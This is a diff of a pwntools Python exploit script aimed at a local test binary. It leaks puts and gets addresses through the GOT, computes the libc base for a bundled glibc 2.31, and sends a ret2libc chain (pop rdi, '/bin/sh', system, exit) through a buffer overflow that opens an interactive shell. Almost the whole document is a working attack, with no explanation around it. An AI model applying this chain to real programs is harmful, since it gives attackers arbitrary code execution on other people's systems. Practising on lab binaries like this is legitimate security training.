@@ -1,7 +1,7 @@
 from pwn import *
 # sudo sysctl -w kernel.core_pattern=core
-elf = ELF("./tests/ret1")
-rop1 = ROP(elf)
+elf = ELF("./tests/ret")
+rop = ROP(elf)
 
 offset_leaking = elf.process()
 p = elf.process()
@@ -19,13 +19,13 @@ if OFFSET == b"":
 
 p.recv()
 
-rop1.call(elf.symbols["puts"], [elf.got['puts']])
-rop1.call(elf.symbols["puts"], [elf.got['gets']])
-rop1.call(elf.symbols["main"])
+rop.call(elf.symbols["puts"], [elf.got['puts']])
+rop.call(elf.symbols["puts"], [elf.got['gets']])
+rop.call(elf.symbols["main"])
 
 payload1 = [
 	b"A"*OFFSET,
-	rop1.chain()
+	rop.chain()
 ]
 
 payload1 = b"".join(payload1)
@@ -39,20 +39,12 @@ log.info(f"Gets @ {hex(gets)}")
 
 LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
 libc = ELF(LIBC)
+libcbase = puts - libc.symbols['puts']
+log.info(f"base libc {hex(libcbase)}")
 
-rop3 = ROP(libc)
-rop3.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
-rop3.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
-rop3.call("exit")
+roplibc = ROP(libc)
 
-payload3 = [
-	b"A"*OFFSET,
-	rop3.chain()
-]
-
-payload3 = b"".join(payload3)
-
-POP_RDI = (rop3.find_gadget(['pop rdi', 'ret']))[0]
+POP_RDI = (roplibc.find_gadget(['pop rdi', 'ret']))[0]
 BINSH = next(libc.search(b"/bin/sh"))
 SYSTEM = libc.sym["system"]
 EXIT = libc.sym["exit"]
@@ -62,5 +54,7 @@ log.info("/bin/sh @ %s " % hex(BINSH))
 log.info("system @ %s " % hex(SYSTEM))
 log.info("exit @ %s " % hex(EXIT))
 
-p.sendline(payload3)
+payload2 = b"A"*OFFSET + p64(POP_RDI+libcbase) + p64(BINSH+libcbase) + p64(SYSTEM+libcbase) + p64(EXIT+libcbase)
+
+p.sendline(payload2)
 p.interactive()
